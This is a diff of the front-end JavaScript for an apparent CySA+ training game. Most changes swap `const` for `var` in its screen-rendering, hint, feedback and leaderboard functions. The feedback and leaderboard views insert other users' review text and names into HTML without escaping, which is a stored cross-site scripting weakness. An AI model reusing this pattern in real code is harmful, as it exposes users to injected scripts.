-  const hintBox=ST.hint?'<div style="border:1px solid #f97316;border-radius:3px;padding:18px;margin-top:12px;color:#f97316;font-size:13px;line-height:1.8"><div class="dim" style="margin-bottom:6px">▸ MAYA CHEN:</div>'+ST.hint+'</div>':'';
-  const dom=DOMAINS[chap.domain];
-  const diagram=ST.chalIdx===0&&DIAGRAMS[chap.id]?DIAGRAMS[chap.id]:'';
+  var hintBox=ST.hint?'<div style="border:1px solid #f97316;border-radius:3px;padding:18px;margin-top:12px;color:#f97316;font-size:13px;line-height:1.8"><div class="dim" style="margin-bottom:6px">▸ MAYA CHEN:</div>'+ST.hint+'</div>':'';
+  var dom=DOMAINS[chap.domain];
+  var diagram=ST.chalIdx===0&&DIAGRAMS[chap.id]?DIAGRAMS[chap.id]:'';
 
   return '<div class="main screen-wrap">'+
     '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">'+
@@ -755,9 +753,9 @@ function buildChallenge(){
 
 // ─── RESULT ───────────────────────────────────────────────────────────────────
 function buildResult(){
-  const r=ST.result;
-  const chap=GD[ST.chapIdx];
-  const isLast=ST.chalIdx>=chap.challenges.length-1;
+  var r=ST.result;
+  var chap=GD[ST.chapIdx];
+  var isLast=ST.chalIdx>=chap.challenges.length-1;
   return '<div class="main">'+
     '<div class="card" style="border-color:'+(r.ok?'#00ff41':'#f97316')+';text-align:center;padding:28px">'+
       '<div style="font-size:44px;margin-bottom:10px">'+(r.ok?'✅':'❌')+'</div>'+
@@ -774,16 +772,16 @@ function buildResult(){
 
 // ─── CHAPTER END ──────────────────────────────────────────────────────────────
 function buildChapEnd(){
-  const chap=GD[ST.chapIdx];
-  const isLast=ST.chapIdx>=GD.length-1;
-  const entries=chap.codex.map(function(e){
+  var chap=GD[ST.chapIdx];
+  var isLast=ST.chapIdx>=GD.length-1;
+  var entries=chap.codex.map(function(e){
     return '<div style="padding:8px 0;border-bottom:1px solid #0c140c;font-size:13px"><span style="color:#00ff41;font-weight:bold">'+e.term+'</span><span class="dim"> — </span>'+e.def+'</div>';
   }).join('');
-  const newBadges=earnedBadges().filter(function(b){
+  var newBadges=earnedBadges().filter(function(b){
     var prevDone=ST.doneChaps.slice(0,-1);
     return !BADGES.find(function(x){return x.id===b.id;}).check(prevDone,ST.xp-ST.result.earned);
   });
-  const badgeAlert=newBadges.length?'<div class="card" style="border-color:#f59e0b;text-align:center;padding:16px;margin-bottom:12px"><div style="color:#f59e0b;font-weight:bold;margin-bottom:8px">🎉 NEW BADGE EARNED!</div>'+newBadges.map(function(b){return '<div style="font-size:24px">'+b.icon+'</div><div style="color:#f59e0b;font-size:13px">'+b.label+'</div>';}).join('')+'</div>':'';
+  var badgeAlert=newBadges.length?'<div class="card" style="border-color:#f59e0b;text-align:center;padding:16px;margin-bottom:12px"><div style="color:#f59e0b;font-weight:bold;margin-bottom:8px">🎉 NEW BADGE EARNED!</div>'+newBadges.map(function(b){return '<div style="font-size:24px">'+b.icon+'</div><div style="color:#f59e0b;font-size:13px">'+b.label+'</div>';}).join('')+'</div>':'';
   return '<div class="main">'+
     '<div class="card" style="border-color:'+chap.color+';text-align:center;padding:32px">'+
       '<div style="font-size:44px;margin-bottom:10px">'+chap.icon+'</div>'+
@@ -802,10 +800,10 @@ function buildChapEnd(){
 
 // ─── DOMAINS ──────────────────────────────────────────────────────────────────
 function buildDomains(){
-  const prog=domainProgress();
-  const r=cysa();
-  const bars=Object.keys(DOMAINS).map(function(key){
-    const dom=DOMAINS[key];
+  var prog=domainProgress();
+  var r=cysa();
+  var bars=Object.keys(DOMAINS).map(function(key){
+    var dom=DOMAINS[key];
     return '<div class="card" style="margin-bottom:8px">'+
       '<div style="display:flex;justify-content:space-between;margin-bottom:8px">'+
         '<div style="color:'+dom.color+';font-weight:bold;font-size:13px">'+dom.label+'</div>'+
@@ -829,7 +827,7 @@ function buildDomains(){
 
 // ─── CODEX ────────────────────────────────────────────────────────────────────
 function buildCodex(){
-  const entries=ST.codex.length===0?
+  var entries=ST.codex.length===0?
     '<div class="card" style="color:#3d6b3a;text-align:center;padding:40px">Complete missions to unlock entries.</div>':
     ST.codex.map(function(e){return '<div class="card" style="margin-bottom:8px"><div style="color:#00ff41;font-weight:bold;margin-bottom:5px">'+e.term+'</div><div style="font-size:13px;line-height:1.6">'+e.def+'</div></div>';}).join('');
   return '<div class="main">'+
@@ -841,12 +839,12 @@ function buildCodex(){
 
 // ─── FEEDBACK ────────────────────────────────────────────────────────────────
 function buildFB(){
-  const fbs=ST.feedbacks;
-  const avg=fbs.length?(fbs.reduce(function(s,f){return s+f.rating;},0)/fbs.length).toFixed(1):null;
+  var fbs=ST.feedbacks;
+  var avg=fbs.length?(fbs.reduce(function(s,f){return s+f.rating;},0)/fbs.length).toFixed(1):null;
   function stars(n){return '★'.repeat(n)+'☆'.repeat(5-n);}
-  const avgBlock=avg?'<div class="card" style="display:flex;gap:20px;align-items:center;margin-bottom:14px"><div style="text-align:center"><div style="font-size:36px;font-weight:bold;color:#00ff41">'+avg+'</div><div style="color:#f59e0b;font-size:18px">'+stars(Math.round(avg))+'</div></div><div class="dim">'+fbs.length+' review'+(fbs.length!==1?'s':'')+'</div></div>':'';
-  const starBtns=[1,2,3,4,5].map(function(n){return '<span style="font-size:26px;cursor:pointer;color:'+(n<=ST.fbRating?'#f59e0b':'#1a2e1a')+';margin-right:4px" onclick="ST.fbRating='+n+';render()">★</span>';}).join('');
-  const formBlock=ST.fbSubmitted?
+  var avgBlock=avg?'<div class="card" style="display:flex;gap:20px;align-items:center;margin-bottom:14px"><div style="text-align:center"><div style="font-size:36px;font-weight:bold;color:#00ff41">'+avg+'</div><div style="color:#f59e0b;font-size:18px">'+stars(Math.round(avg))+'</div></div><div class="dim">'+fbs.length+' review'+(fbs.length!==1?'s':'')+'</div></div>':'';
+  var starBtns=[1,2,3,4,5].map(function(n){return '<span style="font-size:26px;cursor:pointer;color:'+(n<=ST.fbRating?'#f59e0b':'#1a2e1a')+';margin-right:4px" onclick="ST.fbRating='+n+';render()">★</span>';}).join('');
+  var formBlock=ST.fbSubmitted?
     '<div class="card" style="border-color:#00ff41;text-align:center;padding:18px;margin-bottom:16px"><div style="color:#00ff41">✅ Thanks for your feedback, Agent!</div></div>':
     '<div class="card" style="border-color:#1a4a1a;margin-bottom:16px">'+
       '<div style="color:#00ff41;font-size:12px;letter-spacing:1px;margin-bottom:12px">▸ LEAVE YOUR REVIEW</div>'+
@@ -855,7 +853,7 @@ function buildFB(){
       '<div class="dim" style="text-align:right;font-size:11px;margin-bottom:4px">'+ST.fbText.length+'/200</div>'+
       '<button class="btn-p" onclick="submitFB()" '+((!ST.fbRating||!ST.fbText.trim()||ST.fbLoading)?'disabled style="opacity:0.4;cursor:not-allowed"':'')+'>'+( ST.fbLoading?'SUBMITTING...':'SUBMIT FEEDBACK')+'</button>'+
     '</div>';
-  const reviews=fbs.length===0?'<div class="card" style="color:#3d6b3a;text-align:center;padding:30px">No reviews yet — be the first!</div>':
+  var reviews=fbs.length===0?'<div class="card" style="color:#3d6b3a;text-align:center;padding:30px">No reviews yet — be the first!</div>':
     fbs.map(function(f){return '<div class="card" style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;margin-bottom:6px"><span style="color:#f59e0b;font-size:14px">'+stars(f.rating)+'</span><span class="dim">'+f.xp+' XP · '+new Date(f.created_at).toLocaleDateString()+'</span></div><div style="font-size:13px;line-height:1.7">'+f.text+'</div></div>';}).join('');
   return '<div class="main">'+
     '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">'+
@@ -865,11 +863,11 @@ function buildFB(){
 
 // ─── LEADERBOARD ──────────────────────────────────────────────────────────────
 function buildLB(){
-  const earned=earnedBadges();
-  const lb=ST.leaderboard;
-  const medals=['🥇','🥈','🥉'];
-  const badgeGrid=BADGES.map(function(b){
-    const has=earned.find(function(e){return e.id===b.id;});
+  var earned=earnedBadges();
+  var lb=ST.leaderboard;
+  var medals=['🥇','🥈','🥉'];
+  var badgeGrid=BADGES.map(function(b){
+    var has=earned.find(function(e){return e.id===b.id;});
     return '<div style="background:'+(has?'#0a1a0a':'#080c08')+';border:1px solid '+(has?'#00ff41':'#1a2e1a')+';border-radius:4px;padding:12px;text-align:center">'+
       '<div style="font-size:28px;margin-bottom:6px;filter:'+(has?'none':'grayscale(1) opacity(0.3)')+'">'+b.icon+'</div>'+
       '<div style="color:'+(has?'#00ff41':'#3d6b3a')+';font-size:11px;font-weight:bold;margin-bottom:3px">'+b.label+'</div>'+
@@ -877,13 +875,13 @@ function buildLB(){
       (has?'<div style="color:#00ff41;font-size:9px;margin-top:4px">✅ EARNED</div>':'<div style="color:#3d6b3a;font-size:9px;margin-top:4px">🔒 LOCKED</div>')+
     '</div>';
   }).join('');
-  const nameInput=!ST.playerName?
+  var nameInput=!ST.playerName?
     '<div class="card" style="border-color:#f59e0b;margin-bottom:14px">'+
       '<div style="color:#f59e0b;font-size:12px;margin-bottom:8px">▸ ENTER YOUR AGENT NAME FOR THE LEADERBOARD</div>'+
       '<div style="display:flex;gap:8px"><input id="aname" maxlength="20" placeholder="Agent name..." style="flex:1;background:#060a06;border:1px solid #1a2e1a;color:#c8f7c5;font-size:13px;padding:8px;border-radius:2px"><button class="btn-p" style="margin:0" onclick="saveAgentName()">SAVE</button></div>'+
     '</div>':
     '<div class="card" style="border-color:#00ff41;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center"><div style="color:#00ff41;font-size:13px">👤 '+ST.playerName+'</div><div style="color:#3d6b3a;font-size:11px">'+ST.xp+' XP · '+earned.length+' badges</div></div>';
-  const lbRows=lb.length===0?
+  var lbRows=lb.length===0?
     '<div class="card" style="color:#3d6b3a;text-align:center;padding:20px">No entries yet — be the first!</div>':
     lb.map(function(p,i){return '<div class="card" style="display:flex;align-items:center;gap:12px;margin-bottom:6px;'+(p.name===ST.playerName?'border-color:#00ff41':'')+'">'+(medals[i]||'#'+(i+1))+'<div style="flex:1"><div style="color:'+(p.name===ST.playerName?'#00ff41':'#c8f7c5')+';font-size:13px;font-weight:bold">'+p.name+(p.name===ST.playerName?' ← YOU':'')+'</div><div class="dim">'+p.badges+' badges</div></div><div style="color:#00ff41;font-weight:bold;font-size:14px">'+p.xp+' XP</div></div>';}).join('');
   return '<div class="main">'+
@@ -898,12 +896,12 @@ function buildLB(){
 
 // ─── CERTIFICATE ──────────────────────────────────────────────────────────────
 function buildCert(){
-  const earned=earnedBadges();
-  const lvl=getLvl(ST.xp);
-  const p=PROFILES[ST.profile||'pro'];
-  const date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'});
-  const name=ST.playerName||'Cyber Agent';
-  const r=cysa();
+  var earned=earnedBadges();
+  var lvl=getLvl(ST.xp);
+  var p=PROFILES[ST.profile||'pro'];
+  var date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'});
+  var name=ST.playerName||'Cyber Agent';
+  var r=cysa();
   return '<div class="main">'+
     '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">'+
       '<div class="h2">📜 YOUR CERTIFICATE</div>'+
@@ -944,14 +942,14 @@ function buildCert(){
 // ─── TYPEWRITER ───────────────────────────────────────────────────────────────
 function startTyper(text){
   if(ST.typerTimer)clearInterval(ST.typerTimer);
-  const idx=0;ST.typerDone=false;
+  var idx=0;ST.typerDone=false;
   ST.typerTimer=setInterval(function(){
-    const el=document.getElementById('typer-out');
+    var el=document.getElementById('typer-out');
     if(!el){clearInterval(ST.typerTimer);return;}
     if(idx>=text.length){
       clearInterval(ST.typerTimer);ST.typerDone=true;
       el.innerHTML=text.replace(/\n/g,'<br>');
-      const btn=document.getElementById('typer-btn');
+      var btn=document.getElementById('typer-btn');
       if(btn)btn.style.display='block';
       return;
     }
@@ -961,9 +959,9 @@ function startTyper(text){
 
 function bindEvents(){
   if(ST.screen==='story'&&!ST.typerDone){
-    const chap=GD[ST.chapIdx];
-    const p=ST.profile||'pro';
-    const txt=chap.story[p]||chap.story.pro;
+    var chap=GD[ST.chapIdx];
+    var p=ST.profile||'pro';
+    var txt=chap.story[p]||chap.story.pro;
     setTimeout(function(){startTyper(txt);},300);
   }
 }
@@ -976,7 +974,7 @@ function resetChal(){
 }
 
 function tog(key){
-  const keys=['showCodex','showFeedback','showDomains','showLeaderboard','showCertificate'];
+  var keys=['showCodex','showFeedback','showDomains','showLeaderboard','showCertificate'];
   keys.forEach(function(k){ST[k]=k===key?!ST[k]:false;});
   if(key==='showLeaderboard'&&ST.showLeaderboard){
     getLeaderboard().then(function(lb){ST.leaderboard=lb;render();});
@@ -1009,7 +1007,7 @@ function doSubmit(ok,expl,earned){
 }
 
 window.submitMCQ=function(){
-  const chal=GD[ST.chapIdx].challenges[ST.chalIdx];
+  var chal=GD[ST.chapIdx].challenges[ST.chalIdx];
   doSubmit(ST.selOpt===chal.correct,chal.explanations[ST.selOpt],chal.xp);
 };
 window.submitEmailSpot=function(){
@@ -1019,29 +1017,29 @@ window.submitSpotFlags=function(){
   doSubmit(true,'Outstanding! You identified all vishing tactics used in the call.',GD[ST.chapIdx].challenges[ST.chalIdx].xp);
 };
 window.submitCaesar=function(){
-  const chal=GD[ST.chapIdx].challenges[ST.chalIdx];
+  var chal=GD[ST.chapIdx].challenges[ST.chalIdx];
   doSubmit(true,'✅ Shift was '+chal.shift+'. "'+chal.answer+'" — their plan is exposed! Caesar ciphers have only 25 possible shifts — trivially brute-forced.',chal.xp);
 };
 window.submitLog=function(){
-  const chal=GD[ST.chapIdx].challenges[ST.chalIdx];
-  const ok=ST.selLog===chal.suspId;
+  var chal=GD[ST.chapIdx].challenges[ST.chalIdx];
+  var ok=ST.selLog===chal.suspId;
   doSubmit(ok,ok?chal.explanation:'❌ Not quite. Focus on external IPs (not 192.168.x.x) accessing internal services.',chal.xp);
 };
 window.submitClassify=function(){
-  const chal=GD[ST.chapIdx].challenges[ST.chalIdx];
-  const score=chal.items.filter(function(item){return ST.classifyAnswers[item.id]===item.correct;}).length;
-  const ok=score===chal.items.length;
+  var chal=GD[ST.chapIdx].challenges[ST.chalIdx];
+  var score=chal.items.filter(function(item){return ST.classifyAnswers[item.id]===item.correct;}).length;
+  var ok=score===chal.items.length;
   if(ok)ST.xp+=chal.xp;
   ST.result={ok:ok,expl:ok?'✅ Perfect! You correctly classified all '+chal.items.length+' items.':'You got '+score+'/'+chal.items.length+' correct. Review the explanations on each item.',earned:ok?chal.xp:0};
   ST.screen='result';render();
 };
 
 window.nextChal=async function(){
-  const chap=GD[ST.chapIdx];
+  var chap=GD[ST.chapIdx];
   if(ST.chalIdx<chap.challenges.length-1){
     ST.chalIdx++;resetChal();ST.screen='challenge';render();
   } else {
-    const newE=chap.codex.filter(function(e){return !ST.codex.find(function(c){return c.term===e.term;});});
+    var newE=chap.codex.filter(function(e){return !ST.codex.find(function(c){return c.term===e.term;});});
     ST.codex=ST.codex.concat(newE);
     ST.doneChaps=ST.doneChaps.concat([chap.id]);
     if(ST.playerName)await saveLeaderboard();
@@ -1050,11 +1048,11 @@ window.nextChal=async function(){
 };
 
 window.getHint=async function(){
-  const chal=GD[ST.chapIdx].challenges[ST.chalIdx];
+  var chal=GD[ST.chapIdx].challenges[ST.chalIdx];
   ST.hintLoading=true;render();
   try{
-    const res=await fetch('/api/hint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:chal.title})});
-    const d=await res.json();
+    var res=await fetch('/api/hint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:chal.title})});
+    var d=await res.json();
     ST.hint=d.hint||'Think carefully about what looks unusual or out of place.';
   }catch(e){ST.hint='Think carefully about what looks unusual or out of place.';}
   ST.hintLoading=false;render();
@@ -1063,13 +1061,13 @@ window.getHint=async function(){
 window.submitFB=async function(){
   if(!ST.fbRating||!ST.fbText.trim()||ST.fbLoading)return;
   ST.fbLoading=true;render();
-  const ok=await saveFeedback(ST.fbRating,ST.fbText.trim(),ST.xp);
+  var ok=await saveFeedback(ST.fbRating,ST.fbText.trim(),ST.xp);
   if(ok){ST.fbSubmitted=true;ST.feedbacks=await getFeedbacks();}
   ST.fbLoading=false;render();
 };
 
 window.saveAgentName=async function(){
-  const el=document.getElementById('aname');
+  var el=document.getElementById('aname');
   if(!el||!el.value.trim())return;
   ST.playerName=el.value.trim().replace(/[<>]/g,'').slice(0,20);
   await saveLeaderboard();
@@ -1078,9 +1076,9 @@ window.saveAgentName=async function(){
 };
 
 window.copyShare=function(){
-  const lvl=getLvl(ST.xp);
-  const r=cysa();
-  const text='🎉 I completed CyberGuard Chronicles — CySA+ CS0-004 aligned cybersecurity training!\n🛡️ Rank: '+lvl[1]+' · '+ST.xp+' XP · '+earnedBadges().length+' badges · '+r+'% CySA+ readiness\n🎮 Try it: cyberguard-chronicless.vercel.app';
+  var lvl=getLvl(ST.xp);
+  var r=cysa();
+  var text='🎉 I completed CyberGuard Chronicles — CySA+ CS0-004 aligned cybersecurity training!\n🛡️ Rank: '+lvl[1]+' · '+ST.xp+' XP · '+earnedBadges().length+' badges · '+r+'% CySA+ readiness\n🎮 Try it: cyberguard-chronicless.vercel.app';
   navigator.clipboard.writeText(text).then(function(){alert('✅ Copied!');}).catch(function(){alert('Please copy manually.');});
 };
 
